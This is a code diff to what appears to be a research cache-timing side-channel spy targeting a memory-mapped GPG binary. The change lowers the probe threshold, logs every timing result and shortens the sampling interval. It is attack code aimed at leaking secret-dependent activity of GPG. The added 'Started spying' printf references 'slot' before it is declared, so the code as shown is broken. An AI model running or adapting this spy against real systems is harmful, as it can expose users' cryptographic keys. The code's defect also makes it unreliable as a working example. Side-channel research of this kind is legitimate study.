@@ -11,7 +11,7 @@
 #define GPG_MAX_SIZE_BYTES 4194304
 
 // See paper for the threshold of probe()
-#define PROBE_THRESHOLD 120ul
+#define PROBE_THRESHOLD 110ul
 
 // Maximum number of addresses to probe
 #define MAX_NUM_OF_ADDRS 10u
@@ -62,16 +62,14 @@ int probe_timing(char *adrs) {
 }
 
 void spy(char **addrs, size_t num_addrs, FILE *out_file) {
+    printf("Started spying\n", slot);
     for (int slot = 0; slot < 10000; slot++) {
         for (int addr = 0; addr < (int) num_addrs; addr++) {
             char *ptr = addrs[addr];
             int result = probe_timing(ptr);
             fprintf(out_file, "%d %d %d\n", slot, addr, result);
-            if (result < PROBE_THRESHOLD) {
-                fprintf(out_file, "%d %d %d\n", slot, addr, result);
-            }
         }
-        busy_wait(10000);
+        busy_wait(2500);
     }
 }
 
@@ -129,6 +127,7 @@ int main(int argc, char *argv[]) {
     // implement a SIGTERM / SIGINT handler?
     munmap(gpg_base, map_len);
     cleanup_args(&arguments);
+    printf("Finished\n");
     return 0;
 }
 
